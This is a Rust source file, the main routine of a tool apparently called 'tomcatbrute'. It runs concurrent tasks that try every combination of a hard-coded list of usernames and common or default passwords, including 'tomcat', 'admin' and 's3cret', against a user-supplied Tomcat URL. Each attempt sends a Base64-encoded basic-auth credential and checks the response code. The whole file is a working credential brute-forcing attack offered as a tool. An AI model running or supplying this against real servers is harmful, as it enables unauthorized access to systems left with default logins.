use std::sync::Arc;
use tokio::sync::Semaphore;
use tomcatbrute::command;
use tomcatbrute::command::CmdGet;
use tomcatbrute::encoding64;
use tomcatbrute::getcode;

#[tokio::main]
async fn main() {
    let cp = command::parse_cmd(command::new());
    let sem = Arc::new(Semaphore::new(cp.get_thread().into()));
    let url = Arc::new(cp.get_url());
    let users = vec!["tomcat", "admin", "root", "user"];
    let passwords = vec![
        "123456", "tomcat", "admin", "user", "root", "root123", "s3cret",
    ];
    let mut handles = Vec::new();
    for u in users.clone().into_iter() {
        for p in passwords.clone().into_iter() {
            let clone_url = Arc::clone(&url);
            let sem_clone = Arc::clone(&sem);
            let handle = tokio::spawn(async move {
                // Acquire a permit from the semaphore
                let _a = sem_clone.acquire().await.unwrap();
                let up = format!("{}:{}", u, p);
                getcode::check_code(
                    getcode::get_status_code(clone_url, &encoding64::encode(&up)).await,
                    &up,
                )
                .await;
            });
            handles.push(handle);
        }
    }

    // Wait for all tasks to complete
    for handle in handles {
        handle.await.unwrap();
    }

    println!("task done!");
}
